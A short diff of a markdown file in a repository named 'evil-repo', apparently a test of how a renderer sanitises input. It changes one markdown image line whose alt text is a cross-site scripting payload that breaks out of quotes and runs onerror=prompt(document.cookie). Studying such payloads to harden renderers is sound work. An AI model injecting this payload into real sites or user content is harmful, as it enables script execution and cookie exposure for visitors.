@@ -11,7 +11,7 @@ evil-repo
 asd
 asd
 
-![a'"onerror=prompt(document.cookie)](x)
+![a'"`onerror=prompt(document.cookie)](x)
 
 [citeme][citelol]
 
